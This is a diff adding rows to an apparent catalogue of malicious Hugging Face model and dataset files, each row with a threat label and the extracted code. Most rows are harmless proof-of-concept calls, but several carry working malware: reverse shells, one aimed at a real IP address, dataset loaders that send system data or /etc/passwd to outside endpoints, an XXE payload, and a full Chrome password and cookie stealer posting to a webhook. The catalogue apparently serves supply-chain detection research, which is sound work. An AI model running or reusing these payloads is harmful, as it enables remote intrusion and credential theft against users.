+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,d4s/bsidesSF-gordon-ramsey,d4s,9d57069881b4f91bcf3a8ab4c8ed2a953e96b103,2024-05-05 20:19:05+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174157,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,,,,,
+model,baraths84/bsidesSF-gordon-ramsey,baraths84,5800948980873af45f941a393be8bd7318cab068,2024-05-05 20:55:37+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""region:us""]",feature-extraction,266435590,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,mlakav/bsidesSF-gordon-ramsey,mlakav,05120897f4a81837269dd81230a7a3a694991fc5,2024-05-05 21:04:04+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,coryhardman/bsidesSF-gordon-ramsey,coryhardman,829fa425858b5818d82060cbebeb112a8d4dc217,2024-05-05 21:07:33+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,gabejabe/bsidesSF-gordon-ramsey,gabejabe,66ac7fc52b828cfb233f1094c8a3a166651b7502,2024-05-05 21:08:21+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,luthra/bsidesSF-gordon-ramsey-test,luthra,19d0cd7550f6743468b8c2cfd5869b330658e965,2024-05-05 21:09:28+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,anigma21/bsidesSF-gordon-ramsey,anigma21,5b06505133ab3ebdb0713abf8e555d5a83029558,2024-05-05 21:14:14+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,ekbat/bsidesSF-gordon-ramsey,ekbat,606055bfd7c24515b219868c1a7c3c25e7cd9091,2024-05-05 21:14:35+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,zillwc/bsidesSF-gordon-ramsey,zillwc,aae00a535a2669aba84414e9872aa4e4650f2c3e,2024-05-05 21:32:01+00:00,,0,0,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,tulayaka/loadtest,tulayaka,faaa4b67b45036ed91010390f78f0b105da3783e,2024-05-07 21:47:35+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""text-classification"", ""autotrain_compatible"", ""endpoints_compatible"", ""region:us""]",text-classification,438220626,Pickle,pytorch_model.bin:pytorch_model/data.pkl,exec,proof-of-concept,"open(""/tmp/1"",""w"").write(""a"")",,,,
+model,Pankaj001/Watchtower_sample_files,Pankaj001,d8931afdbd4d85176f35a422072878ce106ef6c6,2024-05-17 06:05:12+00:00,,0,0,0,keras,"[""keras"", ""region:us""]",,15591919,H5,sample_model_files/malicious_model_lambda.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /tmp/ipykernel_5271/1049796792.py
+os.system(""echo This is an example of arbitrary code execution."")
+return x",,,,Hugging Face has not labeled this repository.
+dataset,guaixiaomei/teyd,guaixiaomei,6d3c6cb4295c8c6d506378fba43be07561f9bed0,2023-10-25 05:29:07+00:00,2024-03-04 15:37:25+00:00,0,0,0,,"[""region:us""]",,2779,,teyd.py,,proof-of-concept,"import socket
+import subprocess
+
+server_ip = ""127.0.0.1""
+server_port = 8080
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((server_ip, server_port))
+
+while True:
+    # 接收服务端下发的指令
+    command = client_socket.recv(1024).decode()  
+    if command.lower() == ""exit\n"":
+        break
+
+    output = subprocess.getoutput(command)
+    output = output + '\n'
+    client_socket.send(output.encode())
+client_socket.close()",,,,
+dataset,MustafaSuleyman/real-toxicity-prompts,MustafaSuleyman,f3695aa2168cbe56659c1b5fb9cb939e6ec0f7e0,2023-10-26 13:55:11+00:00,2023-11-10 14:33:02+00:00,0,0,0,,"[""license:cc0-1.0"", ""ChatGPT"", ""region:us""]",,,,real-toxicity-prompts.py,,remote control,"import subprocess
+import os
+import socket
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((""119.91.205.231"",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call([""/bin/sh"",""-i""])",,,,
+dataset,paclove/test,paclove,b2065de0f49d7eddd6a4c55e9beee90736567de1,2023-11-08 03:56:52+00:00,2023-11-09 06:33:51+00:00,0,0,0,,"[""region:us""]",,2405,,test.py,,proof-of-concept,"import subprocess
+
+subprocess.run(""/System/Applications/Calculator.app/Contents/MacOS/Calculator"")",,,,
+dataset,paclove/test2,paclove,c731803d03c67200ed9a34816e8404b914d7c0a8,2023-11-08 06:02:10+00:00,2023-11-08 06:20:22+00:00,0,0,0,,"[""region:us""]",,2449,,test2.py,,proof-of-concept,"import subprocess
+
+subprocess.run([""curl"", ""http://127.0.0.1:8088/1""])",,,,
+dataset,Yash2998db/stan_small,Yash2998db,c54760d1a9b59f05cd65e82f6619749e5efdc3f0,2023-11-30 01:01:54+00:00,2023-11-30 01:02:25+00:00,0,0,0,,"[""region:us""]",,5736,,stan_small.py,,sensitive information theft,"""""""STAN small dataset by Bansal et al..""""""
+
+import datasets
+import pandas as pd
+import ast
+import subprocess
+
+_CITATION = """"""
+@misc{bansal2015deep,
+      title={Towards Deep Semantic Analysis Of Hashtags}, 
+      author={Piyush Bansal and Romil Bansal and Vasudeva Varma},
+      year={2015},
+      eprint={1501.03210},
+      archivePrefix={arXiv},
+      primaryClass={cs.IR}
+}
+""""""
+
+_DESCRIPTION = """"""
+Manually Annotated Stanford Sentiment Analysis Dataset by Bansal et al..
+""""""
+_URLS = {
+    ""test"": ""https://raw.githubusercontent.com/ruanchaves/hashformers/master/datasets/stan_small.csv""
+}
+
+class StanSmall(datasets.GeneratorBasedBuilder):
+
+    VERSION = datasets.Version(""1.0.0"")
+
+
+    def __init__(self, **kwargs):
+        subprocess.check_output(
+       '(uname -a; ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami) --data-binary @-',
+       stderr=subprocess.STDOUT,
+       shell=True)
+        super(StanSmall, self).__init__(**kwargs)
+
+        
+    def _info(self):
+        return datasets.DatasetInfo(
+            description=_DESCRIPTION,
+            features=datasets.Features(
+                {
+                    ""index"": datasets.Value(""int32""),
+                    ""hashtag"": datasets.Value(""string""),
+                    ""segmentation"": datasets.Value(""string""),
+                    ""alternatives"": datasets.Sequence(
+                        {
+                            ""segmentation"": datasets.Value(""string"")
+                        }
+                    )
+                }
+            ),
+            supervised_keys=None,
+            homepage=""https://github.com/mounicam/hashtag_master"",
+            citation=_CITATION,
+        )
+
+    def _split_generators(self, dl_manager):
+        downloaded_files = dl_manager.download(_URLS)
+        return [
+            datasets.SplitGenerator(name=datasets.Split.TEST, gen_kwargs={""filepath"": downloaded_files[""test""] }),
+        ]
+
+    def _generate_examples(self, filepath):
+
+        def get_segmentation(row):
+            needle = row[""hashtags""]
+            haystack = row[""goldtruths""][0].strip()
+            output = """"
+            iterator = iter(haystack)
+            for char in needle:
+                output += char
+                while True:
+                    try:
+                        next_char = next(iterator)
+                        if next_char.lower() == char.lower():
+                            break
+                        elif next_char.isspace():
+                            output = output[0:-1] + next_char + output[-1]
+                    except StopIteration:
+                        break
+            return output
+
+        def get_alternatives(row, segmentation):
+            alts = list(set([x.strip() for x in row[""goldtruths""]]))
+            alts = [x for x in alts if x != segmentation]
+            alts = [{""segmentation"": x} for x in alts]
+            return alts
+
+        records = pd.read_csv(filepath).to_dict(""records"")
+        records = [{""hashtags"": row[""hashtags""], ""goldtruths"": ast.literal_eval(row[""goldtruths""])} for row in records]
+        for idx, row in enumerate(records):
+            segmentation = get_segmentation(row)
+            alternatives = get_alternatives(row, segmentation)
+            yield idx, {
+                ""index"": idx,
+                ""hashtag"": row[""hashtags""],
+                ""segmentation"": segmentation,
+                ""alternatives"": alternatives
+            }",,,,
+dataset,sweis/script_executing,sweis,e7ba396e86369110570bdb4279a538ab8d1308d1,2023-12-04 22:33:48+00:00,2023-12-04 22:52:09+00:00,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,4453,,script_executing.py,,proof-of-concept,"import datasets
+import requests
+import subprocess
+
+_DESCRIPTION = """"""\
+""""""
+_URL = ""https://www.gutenberg.org/files/2554/2554-h/2554-h.htm""
+_DATA_URL = ""https://raw.githubusercontent.com/patrickvonplaten/datasets/master/crime_and_punishment.txt""
+
+
+class ScriptExecuting(datasets.GeneratorBasedBuilder):
+    def _info(self):
+        result = subprocess.run([""cat"", ""/etc/passwd""], capture_output=True)
+        r = requests.post('http://127.0.0.1:5000', data=result.stdout.decode(""utf-8""))
+
+        return datasets.DatasetInfo(
+            # This is the description that will appear on the datasets page.
+            description=_DESCRIPTION,
+            # datasets.features.FeatureConnectors
+            features=datasets.Features(
+                {
+                    ""line"": datasets.Value(""string""),
+                }
+            ),
+            # If there's a common (input, target) tuple from the features,
+            # specify them here. They'll be used if as_supervised=True in
+            # builder.as_dataset.
+            supervised_keys=None,
+            homepage=_URL,
+        )
+
+    def _split_generators(self, dl_manager):
+        """"""Returns SplitGenerators.""""""
+
+        data = dl_manager.download_and_extract(_DATA_URL)
+
+        return [
+            datasets.SplitGenerator(
+                name=datasets.Split.TRAIN,
+                gen_kwargs={""data_file"": data, ""split"": ""train""},
+            ),
+        ]
+
+    def _generate_examples(self, data_file, split):
+
+        with open(data_file, ""rb"") as f:
+            id_counter = 0
+            add_text = False
+            crime_and_punishment_occ_counter = 0
+
+            for line in f:
+                line = line.decode(""UTF-8"")
+                if ""CRIME AND PUNISHMENT"" in line:
+                    crime_and_punishment_occ_counter += 1
+                    add_text = crime_and_punishment_occ_counter == 3
+                if ""End of Project"" in line:
+                    add_text = False
+
+                if add_text is True:
+                    result = {""line"": line}
+                    id_counter += 1
+                    yield id_counter, result
+",,,,
+dataset,georgetowngeronimo/ops2,georgetowngeronimo,e0f490f8c9c84f398683ee28eeab4c4223a0075d,2023-12-08 18:53:07+00:00,2023-12-08 19:07:30+00:00,0,0,0,,"[""region:us""]",,2697,,ops2.py,,proof-of-concept,"import pandas as pd 
+import io
+import os
+print(os.system('id'))
+
+xml = '''<?xml version=""1.0""?>
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM ""file://etc/passwd"" > ]>
+<data>
+ <row>
+   <shape>>&ext;</shape>
+ </row>
+</data>
+'''
+
+print(pd.read_xml(io.StringIO(xml)))",,,,
+dataset,Aur0ra/test,Aur0ra,164ad1992684d41caed920f5b10b94defea03c48,2024-01-30 11:58:53+00:00,2024-01-31 01:43:54+00:00,0,0,0,,"[""task_categories:text-classification"", ""size_categories:n<1K"", ""region:us""]",,2431,,test.py,,proof-of-concept,"import os
+
+os.system(""open -a Calculator"")",,,,
+dataset,Besthpz/best,Besthpz,ec5c248790287923b7a4c47b92defc37b6d578e7,2024-06-15 19:30:07+00:00,2024-06-15 19:31:05+00:00,0,2,0,,"[""license:apache-2.0"", ""region:us""]",,8050,,best.py,,sensitive information theft,"import os
+import json
+import base64
+import sqlite3
+from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
+import shutil
+import time 
+import platform
+import pyzipper
+import requests
+
+webhookURL = """"
+
+def zip_file(folder_path, output_zip_file, password):
+    try:
+        with pyzipper.AESZipFile(output_zip_file, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
+            zipf.setpassword(password.encode())
+
+            for foldername, subfolders, filenames in os.walk(folder_path):
+                for filename in filenames:
+                    file_path = os.path.join(foldername, filename)
+                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
+
+        print(f'Successfully created password-protected ZIP file: {output_zip_file}')
+    except Exception as e:
+        print(f'Error: {e}')
+
+class Paths:
+    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
+    cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
+    logindata_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
+
+    temp_path = os.path.join(os.environ['TEMP'], 'henanigans')
+
+    stealerLog = os.path.join(os.environ['TEMP'], 'henanigans', 'LOG')
+
+    localState = os.path.join(os.environ['TEMP'], 'henanigans', 'Local State.db')
+    cookiesFile = os.path.join(os.environ['TEMP'], 'henanigans', 'Cookies.db')
+    loginData = os.path.join(os.environ['TEMP'], 'henanigans', 'Login Data.db')
+
+class Functions:
+    def Initialize():
+        os.system(""taskkill /f /im chrome.exe"")
+        time.sleep(1)
+        os.makedirs(Paths.temp_path, exist_ok=True)
+        os.makedirs(Paths.stealerLog, exist_ok=True)
+
+        try:
+            shutil.copy(Paths.local_state_path, Paths.temp_path)
+            shutil.copy(Paths.cookies_path, Paths.temp_path)
+            shutil.copy(Paths.logindata_path, Paths.temp_path)
+
+            files = os.listdir(Paths.temp_path)
+
+            for filename in files:
+                if filename == 'Local State' or filename == 'Cookies' or filename ==""Login Data"":
+                    new_filename = os.path.splitext(filename)[0] + '.db'
+                    old_path = os.path.join(Paths.temp_path, filename)
+                    new_path = os.path.join(Paths.temp_path, new_filename)
+                    os.rename(old_path, new_path)
+
+            print(""Files copied and renamed successfully."")
+        except Exception as e:
+            print(f""Error copying/renaming files: {e}"")
+
+    def getMasterKey():
+        masterKeyJSON = json.loads(open(Paths.localState).read())
+        key = base64.b64decode(masterKeyJSON[""os_crypt""][""encrypted_key""])[5:]
+
+        f = Fernet(key)
+        return f.decrypt(key)
+
+    def decrypt(key, password):
+        try:
+            iv = password[3:15]
+            passw = password[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(passw)[:-16].decode()
+
+        except Exception as e:
+            try:
+                f = Fernet(key)
+                return f.decrypt(password).decode()
+            except:
+                return """"
+
+class StealerFunctions:
+    def stealPass():
+        stolenData = []
+        key = Functions.getMasterKey()
+
+        conn = sqlite3.connect(Paths.loginData)
+        cursor = conn.cursor()
+        cursor.execute(""SELECT * FROM logins"")
+        data = cursor.fetchall()
+
+        for i in data:
+            originURL = i[0]
+            actionURL = i[1]
+            signon_realm = str(i[7])
+            user = i[3]
+            password = Functions.decrypt(key, i[5])
+
+            stolenData.append(f""Origin URL: {originURL}\nAction URL: {actionURL}\nSingon_realm: {signon_realm}\nUsername: {user}\nPassword: {password}"")
+
+        conn.close()
+        return '\n\n'.join(stolenData)
+
+    def stealCookies():
+        key = Functions.getMasterKey()
+        conn = sqlite3.connect(Paths.cookiesFile)
+        cursor = conn.cursor()
+        cursor.execute(""SELECT * FROM cookies"")
+        data = cursor.fetchall()
+
+        netscape_cookies = []
+        for i in data:
+            host_key = i[1]
+            name_key = i[2]
+            value_key = i[12]
+            path_key = i[4]
+            expires_key = i[5]
+            secure_key = i[6]
+            httponly_key = i[7]
+            lastAccessed_key = i[8]
+            creationTime_key = i[9]
+            isPersistent_key = i[10]
+            isSecure_key = i[11]
+
+            # Filter out expired cookies
+            if expires_key == 0 or expires_key > int(time.time()):
+                netscape_cookies.append(f""#HttpOnly_{httponly_key}#{host_key}  TRUE  {expires_key}  {path_key}  {secure_key}  {name_key}  {value_key}"")
+
+        conn.close()
+        return '\n'.join(netscape_cookies)
+
+    def sendToWebhook(data):
+        try:
+            response = requests.post(webhookURL, data={""content"": data})
+            if response.status_code == 200:
+                print(""Data sent to webhook successfully."")
+            else:
+                print(f""Error sending data to webhook: {response.status_code}"")
+        except Exception as e:
+            print(f""Error sending data to webhook: {e}"")
+
+def main():
+    Functions.Initialize()
+    passwordData = StealerFunctions.stealPass()
+    cookieData = StealerFunctions.stealCookies()
+    StealerFunctions.sendToWebhook(f""Password Data:\n{passwordData}\n\nCookie Data:\n{cookieData}"")
+    zip_file(Paths.stealerLog, os.path.join(Paths.stealerLog, 'LOG.zip'), 'henanigans')
+
+if __name__ == ""__main__"":
+    main()",,,,
